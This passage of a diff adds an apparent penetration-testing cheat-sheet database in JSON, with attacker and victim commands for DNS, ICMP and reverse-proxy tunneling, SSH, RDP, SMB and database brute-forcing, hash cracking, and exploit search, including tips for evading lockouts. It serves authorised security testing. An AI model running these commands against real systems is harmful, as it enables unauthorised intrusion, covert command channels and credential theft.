+          "command": "# Inside MSF after backgrounding session\nuse post/multi/manage/autoroute\nset SESSION {SESSION_ID}\nset SUBNET {SUBNET}\nrun\nuse auxiliary/server/socks_proxy\nset VERSION 4a\nrun",
+          "note": "Then set 'socks4 127.0.0.1 1080' in /etc/proxychains.conf"
+        }
+      ],
+      "see_also": ["chisel", "ssh-tunnel"]
+    },
+    "dns-tunnel": {
+      "name": "DNS Tunneling",
+      "full_name": "DNS Tunnel with Iodine and DNSCat2",
+      "description": "Tunnel TCP or C&C traffic over DNS queries — useful when only port 53/UDP is allowed outbound. Iodine creates a tun interface; DNSCat2 provides a C&C channel without root.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["iodine", "dnscat2", "dns tunnel", "dns exfil"],
+      "commands": [
+        {
+          "name": "Iodine server (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "iodined -f -c -P {PASS} 1.1.1.1 {TUNNEL_DOMAIN}",
+          "note": "Needs a domain with NS record pointing to attacker IP"
+        },
+        {
+          "name": "Iodine client (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "iodine -f -P {PASS} {TUNNEL_DOMAIN} -r",
+          "note": "Victim will be at 1.1.1.2"
+        },
+        {
+          "name": "SSH over Iodine tunnel",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ssh {USER}@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080",
+          "note": "Create compressed SOCKS proxy through the DNS tunnel"
+        },
+        {
+          "name": "DNSCat2 server (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "ruby ./dnscat2.rb {TUNNEL_DOMAIN}",
+          "note": "Or for internal use: ruby dnscat2.rb --dns host={IP},port=53,domain={DOMAIN} --no-cache"
+        },
+        {
+          "name": "DNSCat2 client (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "./dnscat2 {TUNNEL_DOMAIN}",
+          "note": "No root required"
+        },
+        {
+          "name": "DNSCat2 PowerShell client",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "Import-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver {LHOST} -Domain {DOMAIN} -PreSharedSecret {SECRET} -Exec cmd",
+          "note": ""
+        },
+        {
+          "name": "DNSCat2 port forward",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "session -i {SESSION_ID}\nlisten 127.0.0.1:{LPORT} {TARGET_IP}:{TARGET_PORT}",
+          "note": "Inside dnscat2 session"
+        }
+      ],
+      "see_also": ["icmp-tunnel", "chisel", "frp"]
+    },
+    "icmp-tunnel": {
+      "name": "ICMP Tunneling",
+      "full_name": "TCP over ICMP with Hans and ptunnel-ng",
+      "description": "Tunnel TCP traffic inside ICMP echo requests for environments that only allow ping outbound. Hans creates a tun interface; ptunnel-ng wraps TCP directly.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["hans", "ptunnel", "icmp tunnel"],
+      "commands": [
+        {
+          "name": "Hans server (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "./hans -v -f -s 1.1.1.1 -p {PASS}",
+          "note": "1.1.1.1 is the VPN subnet base; root required"
+        },
+        {
+          "name": "Hans client (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "./hans -f -c {LHOST} -p {PASS} -v",
+          "note": "Victim will be at 1.1.1.100 after connection"
+        },
+        {
+          "name": "ptunnel-ng server (victim)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "sudo ptunnel-ng",
+          "note": "Victim must be able to receive ICMP"
+        },
+        {
+          "name": "ptunnel-ng client (attacker)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "sudo ptunnel-ng -p {IP} -l {LPORT} -r {TARGET_IP} -R {TARGET_PORT}\n# Then SSH through the tunnel:\nssh -p {LPORT} -l {USER} 127.0.0.1",
+          "note": ""
+        }
+      ],
+      "see_also": ["dns-tunnel", "icmp-exfil"]
+    },
+    "ngrok": {
+      "name": "ngrok",
+      "full_name": "ngrok Public Tunnel Exposure",
+      "description": "Instantly expose local ports to the internet via a ngrok subdomain. No firewall rules needed — all traffic goes through ngrok's cloud.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["ngrok tcp", "ngrok http"],
+      "commands": [
+        {
+          "name": "Expose TCP port",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "./ngrok tcp {PORT}",
+          "note": "e.g. nc -nvlp 4444 on attacker, ngrok gives public address"
+        },
+        {
+          "name": "Expose HTTP file server",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "./ngrok http file:///tmp/httpbin/",
+          "note": ""
+        },
+        {
+          "name": "Expose internal HTTP service",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "./ngrok http localhost:{PORT} --host-header=rewrite",
+          "note": ""
+        }
+      ],
+      "see_also": ["cloudflared", "frp"]
+    },
+    "cloudflared": {
+      "name": "Cloudflared",
+      "full_name": "Cloudflare Tunnel (cloudflared)",
+      "description": "Create outbound-only tunnels through Cloudflare's edge — no inbound firewall rules needed. Works even when only HTTPS egress is allowed.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["cloudflare tunnel", "trycloudflare"],
+      "commands": [
+        {
+          "name": "Quick tunnel (no auth)",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "cloudflared tunnel --url http://localhost:{PORT}",
+          "note": "Generates a random *.trycloudflare.com URL"
+        },
+        {
+          "name": "SOCKS5 pivot via cloudflared",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "cloudflared tunnel --url socks5://localhost:1080 --socks5",
+          "note": "Use proxychains with 127.0.0.1:1080"
+        },
+        {
+          "name": "Persistent named tunnel",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "cloudflared tunnel create mytunnel\ncloudflared tunnel route dns mytunnel internal.example.com\ncloudflared tunnel run mytunnel",
+          "note": "Requires Cloudflare account and zone"
+        }
+      ],
+      "see_also": ["ngrok", "frp"]
+    },
+    "frp": {
+      "name": "FRP",
+      "full_name": "Fast Reverse Proxy (frp)",
+      "description": "Go-based reverse proxy supporting TCP/UDP/HTTP/SOCKS. The SSH Tunnel Gateway mode (v0.53+) lets the victim use just the stock OpenSSH client — no frpc binary needed.",
+      "topic": "tunneling",
+      "platform": "both",
+      "aliases": ["frps", "frpc", "fast reverse proxy"],
+      "commands": [
+        {
+          "name": "Classic reverse TCP tunnel",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "# Attacker: frps.toml\n# [common]\n# bind_port = 7000\n./frps -c frps.toml\n\n# Victim: frpc.toml\n# serverAddr = \"{LHOST}\"\n# serverPort = 7000\n# [[proxies]]\n# name = \"rdp\"\n# type = \"tcp\"\n# localIP = \"127.0.0.1\"\n# localPort = 3389\n# remotePort = 5000\n./frpc -c frpc.toml",
+          "note": "RDP at attacker_ip:5000"
+        },
+        {
+          "name": "SSH gateway (no frpc binary on victim)",
+          "platform": "both",
+          "category": "tunneling",
+          "command": "# Add to frps.toml on attacker:\n# [sshTunnelGateway]\n# bindPort = 2200\n./frps -c frps.toml\n\n# Victim (OpenSSH only):\nssh -R :{LPORT}:127.0.0.1:{PORT} v0@{LHOST} -p 2200",
+          "note": "Exposes victim's PORT as attacker_ip:LPORT without deploying frpc"
+        }
+      ],
+      "see_also": ["chisel", "ngrok", "cloudflared"]
+    },
+    "regeorg": {
+      "name": "reGeorg",
+      "full_name": "reGeorg Web-based SOCKS Tunnel",
+      "description": "Tunnel SOCKS traffic through a web application by uploading a tunnel file (PHP/ASPX/JSP). Useful when only HTTP is accessible to the target.",
+      "topic": "tunneling",
+      "platform": "linux",
+      "aliases": ["regeorg socks", "web tunnel"],
+      "commands": [
+        {
+          "name": "Start reGeorg SOCKS proxy",
+          "platform": "linux",
+          "category": "tunneling",
+          "command": "python reGeorgSocksProxy.py -p 8080 -u http://{IP}:{PORT}/tunnel/tunnel.jsp",
+          "note": "Upload tunnel.ashx/aspx/php/jsp to the target web server first"
+        }
+      ],
+      "see_also": ["chisel", "socat-tunnel"]
+    },
+    "socks-over-rdp": {
+      "name": "SocksOverRDP",
+      "full_name": "SOCKS Proxy Tunneled over RDP",
+      "description": "Route SOCKS traffic through an existing RDP session using Dynamic Virtual Channels. Requires RDP access and no additional network ports.",
+      "topic": "tunneling",
+      "platform": "windows",
+      "aliases": ["socksoverrdp", "rdp pivot", "rdp socks"],
+      "commands": [
+        {
+          "name": "Load plugin on RDP client",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "regsvr32.exe SocksOverRDP-Plugin.dll",
+          "note": "Run on attacker before connecting via mstsc; plugin listens on 127.0.0.1:1080"
+        },
+        {
+          "name": "Run server on victim (over RDP)",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "SocksOverRDP-Server.exe",
+          "note": "Upload and run on victim via the RDP session"
+        },
+        {
+          "name": "Verify SOCKS listener",
+          "platform": "windows",
+          "category": "tunneling",
+          "command": "netstat -antb | findstr 1080",
+          "note": "Should show 127.0.0.1:1080 listening on attacker"
+        }
+      ],
+      "see_also": ["ssh-tunnel", "chisel"]
+    },
+    "wordlist-generation": {
+      "name": "Wordlist Generation",
+      "full_name": "Custom Wordlist and Dictionary Generation",
+      "description": "Generate target-specific password lists using crunch (character sets), cewl (website scraping), CUPP (personal info), and wister (word mutation).",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["crunch", "cewl", "cupp", "wister", "wordlist"],
+      "commands": [
+        {
+          "name": "crunch by charset and length",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "crunch 4 6 0123456789ABCDEF -o crunch1.txt",
+          "note": "Generates all combinations from length 4 to 6 using given chars"
+        },
+        {
+          "name": "crunch with pattern/mask",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "crunch 6 8 -t ,@@^^%%",
+          "note": ",=upper @=lower %=digit ^=special"
+        },
+        {
+          "name": "cewl website wordlist",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "cewl {TARGET} -m 5 -w words.txt",
+          "note": "Scrapes words >= 5 chars from target website"
+        },
+        {
+          "name": "CUPP personal info wordlist",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "python3 cupp.py -h",
+          "note": "Interactive mode builds list from target's personal info"
+        },
+        {
+          "name": "wister word mutation",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst",
+          "note": "Generates mutations and combos of given words"
+        },
+        {
+          "name": "John wordlist mutation rules",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "john --wordlist=words.txt --rules --stdout > w_mutated.txt",
+          "note": "Applies John's mangling rules to expand a wordlist"
+        }
+      ],
+      "see_also": ["hashcat", "brute-ssh"]
+    },
+    "brute-ssh": {
+      "name": "SSH Brute Force",
+      "full_name": "SSH Password and Key Brute Force",
+      "description": "Brute force SSH credentials using hydra, ncrack, medusa, patator, or legba. Use -t 1 or low thread counts to avoid lockouts.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra ssh", "ncrack ssh", "medusa ssh"],
+      "commands": [
+        {
+          "name": "hydra SSH",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -l {USER} -P {PASS_FILE} -t 4 {IP} ssh",
+          "note": "Use -t 1 or -t 4 to avoid triggering fail2ban"
+        },
+        {
+          "name": "ncrack SSH",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "ncrack -p 22 --user {USER} -P {PASS_FILE} {IP} -T 5",
+          "note": ""
+        },
+        {
+          "name": "medusa SSH",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "medusa -u {USER} -P {PASS_FILE} -h {IP} -M ssh",
+          "note": ""
+        },
+        {
+          "name": "patator SSH (ignore auth failures)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "patator ssh_login host={IP} port=22 user={USER} 0={PASS_FILE} password=FILE0 -x ignore:mesg='Authentication failed'",
+          "note": ""
+        },
+        {
+          "name": "legba SSH (key auth)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba ssh --username {USER} --password '@/path/to/keys/*' --ssh-auth-mode key --target {IP}:22",
+          "note": "Tries all keys in the directory"
+        }
+      ],
+      "see_also": ["brute-ftp", "brute-rdp", "wordlist-generation"]
+    },
+    "brute-ftp": {
+      "name": "FTP Brute Force",
+      "full_name": "FTP Credential Brute Force",
+      "description": "Brute force FTP logins using hydra, ncrack, medusa, or legba.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra ftp", "ncrack ftp"],
+      "commands": [
+        {
+          "name": "hydra FTP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -l {USER} -P {PASS_FILE} -t 32 {IP} ftp",
+          "note": ""
+        },
+        {
+          "name": "ncrack FTP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "ncrack -p 21 --user {USER} -P {PASS_FILE} {IP}",
+          "note": ""
+        },
+        {
+          "name": "medusa FTP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "medusa -u {USER} -P {PASS_FILE} -h {IP} -M ftp",
+          "note": ""
+        },
+        {
+          "name": "legba FTP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba ftp --username {USER} --password {PASS_FILE} --target {IP}:21",
+          "note": ""
+        }
+      ],
+      "see_also": ["brute-ssh", "wordlist-generation"]
+    },
+    "brute-rdp": {
+      "name": "RDP Brute Force",
+      "full_name": "RDP Credential Brute Force",
+      "description": "Brute force Remote Desktop Protocol logins. Be mindful of account lockout policies.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra rdp", "ncrack rdp", "legba rdp"],
+      "commands": [
+        {
+          "name": "ncrack RDP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "ncrack -vv --user {USER} -P {PASS_FILE} rdp://{IP}",
+          "note": ""
+        },
+        {
+          "name": "hydra RDP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -V -f -L {USER_FILE} -P {PASS_FILE} rdp://{IP}",
+          "note": ""
+        },
+        {
+          "name": "legba RDP",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba rdp --target {IP}:3389 --username {USER} --password {PASS_FILE}",
+          "note": "Also supports --rdp-domain, --rdp-ntlm, --rdp-admin-mode"
+        }
+      ],
+      "see_also": ["brute-smb", "brute-ssh"]
+    },
+    "brute-smb": {
+      "name": "SMB Brute Force",
+      "full_name": "SMB Credential Brute Force",
+      "description": "Brute force SMB/Windows credentials using nmap, hydra, legba, or crackmapexec. Risk of account lockout — check policy first.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra smb", "crackmapexec smb", "nmap smb-brute"],
+      "commands": [
+        {
+          "name": "nmap SMB brute",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "nmap --script smb-brute -p 445 {IP}",
+          "note": ""
+        },
+        {
+          "name": "hydra SMB",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -l Administrator -P {PASS_FILE} {IP} smb -t 1",
+          "note": "-t 1 to avoid lockouts"
+        },
+        {
+          "name": "crackmapexec SMB",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "crackmapexec smb {IP} -u {USER_FILE} -p {PASS_FILE}",
+          "note": ""
+        },
+        {
+          "name": "legba SMB",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba smb --target {IP} --username {USER} --password {PASS_FILE}",
+          "note": ""
+        }
+      ],
+      "see_also": ["brute-ssh", "brute-rdp"]
+    },
+    "brute-http": {
+      "name": "HTTP Brute Force",
+      "full_name": "HTTP Basic Auth and Form Brute Force",
+      "description": "Brute force HTTP basic auth, login forms, NTLM, and CMS logins using hydra, medusa, or legba.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra http", "hydra https", "legba http"],
+      "commands": [
+        {
+          "name": "HTTP Basic Auth (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -L {USER_FILE} -P {PASS_FILE} {IP} http-get {PATH}",
+          "note": "Use https-get for HTTPS"
+        },
+        {
+          "name": "HTTP POST form (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -L {USER_FILE} -P {PASS_FILE} {IP} http-post-form \"{PATH}:name=^USER^&password=^PASS^:Invalid credentials\"",
+          "note": "Adjust field names and failure string to match target"
+        },
+        {
+          "name": "HTTP NTLM (legba)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba http.ntlm2 --domain {DOMAIN} --workstation client --username {USER} --password {PASS_FILE} --target https://{IP}/",
+          "note": ""
+        },
+        {
+          "name": "CMS brute (cmsmap)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "cmsmap -f W -u {USER} -p {PASS} https://{IP}",
+          "note": "W=WordPress J=Joomla D=Drupal M=Moodle"
+        }
+      ],
+      "see_also": ["brute-ssh", "wordlist-generation"]
+    },
+    "brute-db": {
+      "name": "Database Brute Force",
+      "full_name": "Database Service Credential Brute Force",
+      "description": "Brute force MySQL, MSSQL, PostgreSQL, OracleSQL, MongoDB, and Redis credentials.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra mysql", "hydra postgres", "mssqlpwner", "legba mysql"],
+      "commands": [
+        {
+          "name": "MySQL (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -L {USER_FILE} -P {PASS_FILE} {IP} mysql",
+          "note": ""
+        },
+        {
+          "name": "MySQL (legba)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba mysql --username root --password {PASS_FILE} --target {IP}:3306",
+          "note": ""
+        },
+        {
+          "name": "PostgreSQL (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -L {USER_FILE} -P {PASS_FILE} {IP} postgres",
+          "note": ""
+        },
+        {
+          "name": "MSSQL (crackmapexec)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "crackmapexec mssql {IP} -d {DOMAIN} -u {USER_FILE} -p {PASS_FILE}",
+          "note": ""
+        },
+        {
+          "name": "MSSQL (mssqlpwner)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "mssqlpwner hosts.txt brute -ul {USER_FILE} -pl {PASS_FILE}",
+          "note": "Also supports hashes (-hl) and tickets (-tl)"
+        },
+        {
+          "name": "OracleSQL (odat)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "./odat.py passwordguesser -s {IP} -d {SID} --accounts-file accounts.txt",
+          "note": ""
+        },
+        {
+          "name": "MongoDB (legba)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "legba mongodb --target {IP}:27017 --username root --password {PASS_FILE}",
+          "note": ""
+        },
+        {
+          "name": "Redis (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -P {PASS_FILE} redis://{IP}:6379",
+          "note": ""
+        }
+      ],
+      "see_also": ["brute-ssh", "wordlist-generation"]
+    },
+    "brute-misc-services": {
+      "name": "Service Brute Force",
+      "full_name": "LDAP/SMTP/SNMP/VNC/Telnet Brute Force",
+      "description": "Brute force credentials for LDAP, SMTP, SNMP, VNC, Telnet, IMAP, POP3, and other network services.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["hydra ldap", "hydra smtp", "hydra vnc", "nmap snmp-brute"],
+      "commands": [
+        {
+          "name": "LDAP (nmap)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "nmap --script ldap-brute -p 389 {IP}",
+          "note": ""
+        },
+        {
+          "name": "SMTP (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -l {USER} -P {PASS_FILE} {IP} smtp -V",
+          "note": ""
+        },
+        {
+          "name": "SNMP community string brute",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt {IP}",
+          "note": ""
+        },
+        {
+          "name": "VNC (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -L {USER_FILE} -P {PASS_FILE} -s {PORT} {IP} vnc",
+          "note": ""
+        },
+        {
+          "name": "Telnet (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -l {USER} -P {PASS_FILE} -t 32 {IP} telnet",
+          "note": ""
+        },
+        {
+          "name": "IMAP (hydra)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "hydra -l {USER} -P {PASS_FILE} -f {IP} imap -V",
+          "note": "Use -S -s 993 for IMAPS"
+        },
+        {
+          "name": "Winrm (crackmapexec)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "crackmapexec winrm {IP} -d {DOMAIN} -u {USER_FILE} -p {PASS_FILE}",
+          "note": ""
+        }
+      ],
+      "see_also": ["brute-ssh", "brute-http"]
+    },
+    "hashcat": {
+      "name": "Hashcat",
+      "full_name": "Hashcat Offline Hash Cracking",
+      "description": "GPU-accelerated offline hash cracker supporting wordlist, mask, combinator, and hybrid attacks. Covers NTLM, Kerberos, bcrypt, MD5, SHA variants, and hundreds more.",
+      "topic": "brute-force",
+      "platform": "both",
+      "aliases": ["hashcat crack", "gpu crack", "offline crack"],
+      "commands": [
+        {
+          "name": "Wordlist attack with rules",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat -a 0 -m {MODE} {HASHFILE} {WORDLIST} -r rules/best64.rule",
+          "note": "Common modes: 1000=NTLM, 13100=Kerberoast, 3200=bcrypt, 0=MD5, 1800=sha512crypt"
+        },
+        {
+          "name": "Mask attack",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat -a 3 -m {MODE} {HASHFILE} ?u?l?l?l?l?l?l?l?d",
+          "note": "?l=lower ?u=upper ?d=digit ?s=special ?a=all"
+        },
+        {
+          "name": "Combinator attack (two wordlists)",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat -a 1 -m {MODE} {HASHFILE} {WORDLIST1} {WORDLIST2}",
+          "note": "Combines every word from list1 with every word from list2"
+        },
+        {
+          "name": "Show example hashes for mode",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat --example-hashes | grep -B1 -A2 \"NTLM\"",
+          "note": "Find the right -m number for your hash type"
+        },
+        {
+          "name": "Crack NTLM hashes",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat -a 0 -m 1000 {HASHFILE} /usr/share/wordlists/rockyou.txt",
+          "note": ""
+        },
+        {
+          "name": "Crack Kerberoast TGS hashes",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat -m 13100 -a 0 hashes.kerberoast {WORDLIST}",
+          "note": ""
+        },
+        {
+          "name": "Crack JWT HMAC secret",
+          "platform": "both",
+          "category": "brute-force",
+          "command": "hashcat -m 16500 -a 0 {JWT_TOKEN} {WORDLIST}",
+          "note": ""
+        },
+        {
+          "name": "Crack LUKS disk encryption",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "dd if={BACKUP_IMG} of=luckshash bs=512 count=4097\nhashcat -m 14600 -a 0 luckshash {WORDLIST}",
+          "note": "Verify payload offset with cryptsetup luksDump first"
+        }
+      ],
+      "see_also": ["john-the-ripper", "wordlist-generation"]
+    },
+    "john-the-ripper": {
+      "name": "John the Ripper",
+      "full_name": "John the Ripper Hash Cracking",
+      "description": "CPU-based hash cracker with built-in mutation rules. Includes *2john conversion tools for archives, KeePass, PGP, and more.",
+      "topic": "brute-force",
+      "platform": "linux",
+      "aliases": ["john", "john crack", "john2hash"],
+      "commands": [
+        {
+          "name": "Crack NTLM hashes",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT {HASHFILE}",
+          "note": ""
+        },
+        {
+          "name": "Crack Kerberoast hashes",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "john --format=krb5tgs --wordlist={WORDLIST} hashes.kerberoast",
+          "note": ""
+        },
+        {
+          "name": "Crack ZIP archive",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "zip2john {FILE}.zip > zip.john && john zip.john",
+          "note": ""
+        },
+        {
+          "name": "Crack 7z archive",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "cat /usr/share/wordlists/rockyou.txt | 7za t {FILE}.7z",
+          "note": ""
+        },
+        {
+          "name": "Crack PDF password",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "pdfcrack {FILE}.pdf -w /usr/share/wordlists/rockyou.txt",
+          "note": ""
+        },
+        {
+          "name": "Crack KeePass database",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "keepass2john {FILE}.kdbx > hash.john && john --wordlist=/usr/share/wordlists/rockyou.txt hash.john",
+          "note": "Use -k <file-password> if KeePass also requires a key file"
+        },
+        {
+          "name": "Crack PGP/GPG private key",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "gpg2john private_pgp.key > hash.john && john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.john",
+          "note": ""
+        },
+        {
+          "name": "Crack ZIP with known plaintext (bkcrack)",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "zip plaintext.zip {PLAINTEXT_FILE}\n./bkcrack -C {ENCRYPTED}.zip -c {PLAINTEXT_FILE} -P plaintext.zip -p {PLAINTEXT_FILE}",
+          "note": "Recover keys, then: ./bkcrack -C encrypted.zip -k <keys> -U unlocked.zip newpwd"
+        },
+        {
+          "name": "Crack PFX certificate",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "crackpkcs12 -d /usr/share/wordlists/rockyou.txt {CERT}.pfx",
+          "note": ""
+        },
+        {
+          "name": "Apply mutation rules to wordlist",
+          "platform": "linux",
+          "category": "brute-force",
+          "command": "john --wordlist=words.txt --rules=all --stdout > w_mutated.txt",
+          "note": ""
+        }
+      ],
+      "see_also": ["hashcat", "wordlist-generation"]
+    },
+    "searchsploit": {
+      "name": "Searchsploit",
+      "full_name": "Searchsploit Exploit-DB Command Line Search",
+      "description": "Search the local Exploit-DB mirror from the command line. Find, inspect, and copy exploits for services by name, version, or CVE.",
+      "topic": "search-exploits",
+      "platform": "linux",
+      "aliases": ["exploit-db", "exploitdb", "searchsploit"],
+      "commands": [
+        {
+          "name": "Search by service and version",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "searchsploit {SERVICE} {VERSION}",
+          "note": "e.g. searchsploit apache mod_ssl"
+        },
+        {
+          "name": "Copy exploit to current directory",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "searchsploit -m {EXPLOIT_ID}",
+          "note": "e.g. searchsploit -m 7618"
+        },
+        {
+          "name": "Show full exploit path",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "searchsploit -p {EXPLOIT_ID}",
+          "note": ""
+        },
+        {
+          "name": "Open exploit in viewer",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "searchsploit -x {EXPLOIT_ID}",
+          "note": ""
+        },
+        {
+          "name": "Search exploits from nmap XML",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "searchsploit --nmap {NMAP_XML}",
+          "note": "Parses nmap output and searches for each detected service version"
+        }
+      ],
+      "see_also": ["msf-search"]
+    },
+    "msf-search": {
+      "name": "MSF Exploit Search",
+      "full_name": "Metasploit Framework Module Search",
+      "description": "Search for Metasploit modules by platform, port, target OS, and type.",
+      "topic": "search-exploits",
+      "platform": "linux",
+      "aliases": ["msfconsole search", "metasploit search"],
+      "commands": [
+        {
+          "name": "Search MSF modules",
+          "platform": "linux",
+          "category": "enumeration",
+          "command": "msf> search platform:windows port:445 target:XP type:exploit",
+          "note": "Combine platform, port, target, type filters"
+        }
+      ],
+      "see_also": ["searchsploit"]
+    }
+  },
+  "topic_index": {
+    "exfiltration": [
+      "base64-exfil",
+      "http-exfil",
+      "http-server",
+      "webhook-exfil",
+      "ftp-exfil",
+      "smb-exfil",
+      "nc-exfil",
+      "scp-exfil",
+      "icmp-exfil",
+      "smtp-exfil",
+      "tftp-exfil",
+      "vbscript-downloader"
+    ],
+    "tunneling": [
+      "bash-tunnel",
+      "ssh-tunnel",
+      "sshuttle",
+      "chisel",
+      "ligolo-ng",
+      "socat-tunnel",
+      "rpivot",
+      "plink-tunnel",
+      "netsh-portproxy",
+      "meterpreter-pivot",
+      "dns-tunnel",
+      "icmp-tunnel",
+      "ngrok",
+      "cloudflared",
+      "frp",
+      "regeorg",
+      "socks-over-rdp"
+    ],
+    "brute-force": [
+      "wordlist-generation",
+      "brute-ssh",
+      "brute-ftp",
+      "brute-rdp",
+      "brute-smb",
+      "brute-http",
+      "brute-db",
+      "brute-misc-services",
+      "hashcat",
+      "john-the-ripper"
+    ],
+    "search-exploits": [
+      "searchsploit",
+      "msf-search"
+    ]
+  }
+}
